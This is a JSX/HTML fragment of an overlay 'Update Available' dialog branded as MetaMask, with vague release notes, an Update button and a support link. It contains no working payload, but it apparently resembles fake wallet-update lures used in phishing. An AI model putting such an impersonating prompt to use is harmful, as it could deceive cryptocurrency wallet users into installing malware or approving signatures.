<div class="overlay">
          <div class="dialog">
            <div class="content">
              <div class="icon-container">
                <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
                  <path d="M32 12V32M32 32L42 22M32 32L22 22" stroke="#0088CC" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
                  <path d="M16 38H48V48C48 49.1046 47.1046 50 46 50H18C16.8954 50 16 49.1046 16 48V38Z" stroke="#0088CC" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
                  <path d="M16 38H48" stroke="#0088CC" stroke-width="3" stroke-linecap="round"/>
                </svg>
              </div>

              <h1 class="title">Update Available</h1>
              <p class="version">Version 12.12.0</p>

              <ul class="features">
                <li>Fix main build modifying desktop build steps</li>
                <li>Improving the security system</li>
                <li>Fix incorrect network information</li>
                <li>Improve performance on signature request</li>
              </ul>

              <button class="update-btn" onClick={handleUpdate}>
                Update
              </button>

              <p class="support">
                Need help?{' '}
                <a href="#" onClick={(e) => { e.preventDefault(); handleContactSupport(); }}>
                  Contact MetaMask Support
                </a>
              </p>
            </div>
          </div>
        </div>